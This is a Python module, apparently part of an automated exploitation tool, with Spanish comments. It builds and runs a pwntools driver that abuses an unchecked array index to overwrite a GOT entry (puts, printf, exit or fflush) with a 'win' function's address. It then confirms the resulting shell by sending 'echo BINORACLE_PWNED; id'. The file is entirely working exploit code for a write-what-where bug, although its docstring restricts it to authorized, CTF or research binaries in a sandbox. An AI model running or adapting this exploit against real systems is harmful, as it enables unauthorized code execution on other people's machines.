"""Write-what-where (OOB write / unchecked index) -> GOT overwrite -> shell, verificado por
ejecucion.

Patron: el binario lee un INDICE y un VALOR (scanf) y escribe val en un array global SIN
comprobar limites (`table[idx] = val`), y despues llama a alguna funcion de la libc (puts,
printf...) cuya entrada GOT es alcanzable desde el array por aritmetica de punteros. Con una
funcion 'win'/gift y sin PIE, el offset entre el array y la entrada GOT (y entre el array y
la direccion de win) es ESTATICO: no hace falta fuga ninguna, solo aritmetica de direcciones.
Runs en el sandbox binoracle-pwn. Solo para binarios AUTORIZADOS / CTF / research.
"""
from __future__ import annotations

from ._sandbox import run_driver

# candidatos de sink que el binario podria llamar tras el write (para retargetear su GOT)
_TRIGGER_FUNCS = ("puts", "printf", "exit", "fflush")

_DRIVER = r'''
import sys
from pwn import *
context.binary = elf = ELF(sys.argv[1], checksec=False); context.log_level = "error"
win = (elf.symbols or {}).get("win")
if not win:
    print("NOT_APPLICABLE (no win)"); sys.exit(1)
# array global escribible objetivo del write-what-where. Nombre 'table' fijo por ahora (coincide
# con el sample); generalizar a "cualquier simbolo OBJ en .bss" queda para cuando haga falta.
table = (elf.symbols or {}).get("table")
got_targets = [(n, a) for n, a in (elf.got or {}).items() if n in %(triggers)r]
if table is None or not got_targets:
    print("NOT_APPLICABLE (no table/got)"); sys.exit(1)
PROMPTS = [(b"idx: ", b"val: "), (b"index: ", b"value: "), (b"idx", b"val")]
ok = False
for gotname, gotaddr in got_targets:
    idx = (gotaddr - table) // 8
    if idx * 8 + table != gotaddr:
        continue                       # no alineado a 8 bytes: no representable como indice
    for p_idx, p_val in PROMPTS:
        try:
            io = process([elf.path], stderr=subprocess.STDOUT)
            io.recvuntil(p_idx, timeout=3)
            io.sendline(str(idx).encode())
            io.recvuntil(p_val, timeout=3)
            io.sendline(str(win).encode())
            io.sendline(b"echo BINORACLE_PWNED; id")
            out = io.recvrepeat(2.5)
            io.close()
        except Exception:
            try: io.close()
            except Exception: pass
            continue
        if b"BINORACLE_PWNED" in out or b"uid=" in out:
            print("VERIFIED table=%%#x got=%%s(%%#x) win=%%#x idx=%%d" %% (table, gotname, gotaddr, win, idx))
            ok = True
            break
    if ok:
        break
if not ok:
    print("NOT_VERIFIED table=%%#x win=%%#x" %% (table, win))
    sys.exit(1)
''' % {"triggers": _TRIGGER_FUNCS}
_DRIVER = "import subprocess\n" + _DRIVER


def _wow_applicable(binary: str) -> bool:
    """Chequeo barato (sin sandbox): necesita 'win' y un simbolo global 'table'. Si pyelftools
    falta, deja que el driver decida (no bloquea)."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        return "win" in names and "table" in names
    except Exception:
        return True


def autowow_shell(binary: str) -> dict:
    """Explota un write-what-where (indice sin comprobar sobre un array global) retargeteando
    una entrada GOT (puts/printf/...) a 'win', verificado con shell real en el sandbox."""
    if not _wow_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin win/table): write-what-where requiere ambos"}
    res = run_driver(binary, _DRIVER, ".binoracle_wow.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"write-what-where -> GOT=win -> shell (verificado por ejecucion, {eng})"
                   if res.get("verified")
                   else f"no verificado ({eng}): offset de GOT no alineado, o prompt distinto")
    return res


def render_wow(r: dict) -> str:
    out = ["## Write-what-where (confirmacion por ejecucion)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- explotado: **{'SI' if r.get('verified') else 'no'}**")
    out.append(r.get("detail") or r.get("note", ""))
    return "\n".join(out)
